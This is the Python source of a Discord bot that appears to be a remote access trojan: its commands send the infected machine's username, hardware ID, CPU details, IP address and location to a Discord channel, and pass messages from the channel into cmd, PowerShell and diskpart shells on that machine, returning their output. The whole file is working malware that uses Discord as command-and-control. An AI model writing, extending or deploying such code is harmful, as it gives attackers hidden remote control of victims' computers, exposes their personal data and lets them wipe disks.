import discord
from discord.ext import commands
import ctypes
import util
import cmdrat

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

token = ""

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def info(ctx):
    await ctx.channel.send('--------------------------')
    await ctx.channel.send(f"Admin: {util.is_user_admin()}")
    await ctx.channel.send(f"Username: {util.get_user_name()}")
    await ctx.channel.send(f"HWID: {util.get_hwid()}")
    await ctx.channel.send(f"CPU Name: {util.get_cpu_name()}")
    await ctx.channel.send(f"CPU ID: {util.get_cpu_id()}")
    await ctx.channel.send(f"IPv4: {util.get_IPV4()}")
    await ctx.channel.send(f"Location: {util.get_location()}")
    await ctx.channel.send('--------------------------')

@bot.command()
async def diskpart(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "diskpart", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def powershell(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "powershell", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.command()
async def cmd(ctx, *, command):
    user_id = ctx.author.id
    await ctx.send(f"```diff\n- {command}\n```")
    result = cmdrat.start_shell(user_id, "cmd", command)
    await ctx.send(f"```css\n{result}\n```")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    user_id = message.author.id
    
    if message.content == '!exit':
        if cmdrat.has_active_shell(user_id):
            result = cmdrat.end_shell(user_id)
            await message.channel.send(result)
        return
    
    if cmdrat.has_active_shell(user_id) and not message.content.startswith('!'):
        await message.channel.send(f"```diff\n- {message.content}\n```")
        result = cmdrat.send_command(user_id, message.content)
        await message.channel.send(f"```css\n{result}\n```")
    
    await bot.process_commands(message)

bot.run(token)